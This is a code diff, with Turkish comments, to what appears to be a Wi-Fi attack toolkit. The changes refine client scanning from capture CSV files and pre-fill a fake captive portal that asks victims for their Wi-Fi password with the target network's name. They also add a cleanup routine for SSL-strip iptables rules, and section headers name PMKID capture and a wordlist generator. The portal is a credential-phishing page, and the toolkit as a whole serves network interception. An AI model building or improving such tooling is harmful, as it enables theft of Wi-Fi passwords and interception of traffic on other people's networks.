@@ -524,7 +524,11 @@ def get_latest_csv(prefix=CSV_PREFIX, timeout=10):
                   TextColumn("[cyan]CSV aranıyor..."), transient=True) as p:
         p.add_task("", total=None)
         while time.time() < deadline:
-            files = list(Path(str(SCAN_DIR)).glob("*.csv"))
+            # Prefix ile eşleşen dosyaları ara
+            files = list(Path(".").glob(f"{prefix}*.csv"))
+            if not files:
+                # Fallback: scan_results içinde ara
+                files = list(SCAN_DIR.glob("*.csv"))
             if files:
                 return max(files, key=os.path.getmtime)
             time.sleep(0.5)
@@ -818,7 +822,7 @@ p{font-size:12px;color:#aaa}
 <h2>Wi-Fi Aktivasyonu</h2>
 <p>Aga baglanmak icin Wi-Fi sifrenizi girin.</p>
 <form method="POST" action="/login">
-  <input type="text"     name="ssid"     placeholder="Ag Adi" id="s">
+  <input type="text"     name="ssid"     placeholder="Ag Adi" id="s" value="">
   <input type="password" name="password" placeholder="Wi-Fi Sifresi">
   <button type="submit">Baglan</button>
 </form>
@@ -847,8 +851,8 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
         self.send_response(200)
         self.send_header("Content-type", "text/html; charset=utf-8")
         self.end_headers()
-        html = CAPTIVE_PORTAL_HTML.replace(b"document.title||''",
-               f"'{_portal_essid}'".encode())
+        html = CAPTIVE_PORTAL_HTML.replace(
+            b'value=""', f'value="{_portal_essid}"'.encode())
         self.wfile.write(html)
 
     def do_POST(self):
@@ -1327,8 +1331,14 @@ def _wordlist_generator():
     return str(out)
 
 # ══════════════════════════════════════════════════════════════════════
-#  15. SSL STRIP TEMİZLİK (STANDALONE)
+#  15. SSL STRIP TEMİZLİK
 # ══════════════════════════════════════════════════════════════════════
+
+def _ssl_strip_cleanup():
+    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
+    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"],
+                   stdout=subprocess.DEVNULL)
+    success("SSL Strip kuralları temizlendi.")
 
 # ══════════════════════════════════════════════════════════════════════
 #  16. PMKID
@@ -1442,7 +1452,7 @@ def do_client_scan(ap):
         try: cp.terminate(); cp.wait(timeout=3)
         except Exception: cp.kill(); cp.wait()
 
-    csv_f = get_latest_csv(prefix=prefix, timeout=6)
+    csv_f = get_latest_csv(prefix=prefix, timeout=8)
     if not csv_f: warn("İstemci CSV bulunamadı."); return []
     clients = get_clients_of_ap(csv_f, ap["bssid"])
     if not clients: info("İstemci bulunamadı.")
